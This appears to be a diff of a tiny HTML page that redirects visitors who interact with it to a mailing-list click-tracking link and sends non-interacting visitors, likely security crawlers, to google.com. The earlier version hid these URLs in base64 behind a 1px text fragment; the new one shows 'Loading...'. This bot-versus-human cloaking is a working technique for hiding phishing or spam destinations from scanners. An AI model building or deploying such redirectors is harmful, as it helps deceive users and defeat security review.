@@ -6,48 +6,47 @@
   <title>Insight</title>
   <script>
     document.addEventListener("DOMContentLoaded", function () {
-      const timeoutDuration = 3000; // 
-      const mainUrl = "aHR0cHM6Ly9zZW1pLXpjbXAubWFpbGxpc3QtbWFuYWdlLmNvbS9jbGljay8xMTM0ZDFiNjk4ODU0NjJkZi8xMTM0ZDFiNjk4ODU0NWYyNw==";
-      const botUrl = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbQ==";
-
-      // 
-      const decodeUrl = (encodedUrl) => atob(encodedUrl);
-
       const isHuman = () => {
         return new Promise((resolve) => {
           let interacted = false;
 
+          const events = ["mousemove", "keydown", "click", "scroll", "focus"];
           const interactionListener = () => {
             interacted = true;
             resolve(true);
-            // 
-            window.removeEventListener("mousemove", interactionListener);
-            window.removeEventListener("keydown", interactionListener);
+            events.forEach((event) => window.removeEventListener(event, interactionListener));
           };
 
-          //
-          window.addEventListener("mousemove", interactionListener);
-          window.addEventListener("keydown", interactionListener);
+          events.forEach((event) => window.addEventListener(event, interactionListener));
 
-          //
+          // Fallback to check page visibility
+          const checkVisibility = () => {
+            if (document.visibilityState === "visible") {
+              resolve(true);
+            }
+          };
+          document.addEventListener("visibilitychange", checkVisibility);
+
+          // Default timeout for no interaction
           setTimeout(() => {
             if (!interacted) resolve(false);
-          }, timeoutDuration);
+          }, 10000); // 10 seconds
         });
       };
 
-      // Determine user type and redirect
       isHuman().then((human) => {
-        const targetUrl = human ? decodeUrl(mainUrl) : decodeUrl(botUrl);
-        window.location.href = targetUrl;
-      }).catch((err) => {
-        console.error("Error determining user type:", err);
-        window.location.href = decodeUrl(botUrl); //
+        if (human) {
+          // Redirect human users to the main page
+          window.location.href = "https://semi-zcmp.maillist-manage.com/click/1134d1b69885462df/1134d1b6988545f27";
+        } else {
+          // Redirect bots or non-interactive visitors to another URL
+          window.location.href = "https://google.com";
+        }
       });
     });
   </script>
 </head>
 <body>
-  <p style="font-size: 1px;"> ello,Worl </p>
+  <h1>Loading...</h1>
 </body>
 </html>
